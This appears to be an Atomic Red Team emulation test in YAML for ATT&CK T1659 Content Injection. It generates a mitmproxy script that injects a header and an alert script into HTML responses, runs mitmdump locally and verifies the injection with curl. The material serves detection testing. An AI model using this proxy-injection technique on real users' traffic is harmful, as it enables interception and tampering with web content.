- id: 9b360eaf-c778-4f07-a6e7-895c4f01ac1c
  name: MITM Proxy Injection
  description: Start mitmdump and verify injected header and HTML content.
  tactic: command-and-control
  technique:
    attack_id: T1659
    name: Content Injection
  platforms:
    linux:
      sh:
        command: curl -skI --proxy http://127.0.0.1:8080 http://example.com > /tmp/curl_out.txt;
          grep "X-Atomic" /tmp/curl_out.txt || (cat /tmp/curl_out.txt && exit 1);
          curl -sk --proxy http://127.0.0.1:8080 http://example.com > /tmp/atomic_t1659_page.html;
          grep -q "Atomic T1659 Injection" /tmp/atomic_t1659_page.html || (head -20
          /tmp/atomic_t1659_page.html; exit 1)
        cleanup: rm -rf /tmp/atomic_t1659_inject.py; rm -rf /tmp/atomic_t1659.log;
          rm -rf /tmp/curl_out.txt; rm -rf /tmp/atomic_t1659_page.html; pkill -f mitmdump
          || true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - command-and-control
  - t1659
  author: Atomic Red Team
  additional_info:
    dependencies:
    - description: python3 must be installed
      prereq_command: 'command -v python3

        '
      get_prereq_command: 'brew install python3 || (sudo apt-get update && sudo apt-get
        install -y python3) || sudo yum install -y python3

        '
    - description: curl must be installed
      prereq_command: 'command -v curl

        '
      get_prereq_command: 'brew install curl || (sudo apt-get update && sudo apt-get
        install -y curl) || sudo yum install -y curl

        '
    - description: pipx must be installed
      prereq_command: 'pipx --version

        '
      get_prereq_command: 'brew install pipx || (sudo apt-get update && sudo apt-get
        install -y pipx) || sudo yum install -y pipx

        '
    - description: mitmproxy must be installed
      prereq_command: 'pipx list | grep mitmproxy || command -v mitmdump

        '
      get_prereq_command: 'pipx install mitmproxy || brew install mitmproxy

        '
    - description: mitmdump must be running on port 8080
      prereq_command: "lsof -i tcp:8080 | grep mitmdump || lsof -i tcp:8080 | grep\
        \ -i PYTHON \n"
      get_prereq_command: 'printf "from mitmproxy import http\ndef response(flow:
        http.HTTPFlow):\n    if ''text/html'' in flow.response.headers.get(''content-type'',''''):\n        flow.response.headers[''X-Atomic'']=''T1659''\n        flow.response.text
        = flow.response.text.replace(''</body>'', ''<script>alert(\"Atomic T1659 Injection\")</script></body>'')"
        > /tmp/atomic_t1659_inject.py

        ($HOME/.local/bin/mitmdump -s /tmp/atomic_t1659_inject.py -p 8080 > /tmp/atomic_t1659.log
        2>&1 &)

        sleep 5

        lsof -i tcp:8080 | grep mitmdump || (cat /tmp/atomic_t1659.log; exit 1)

        '
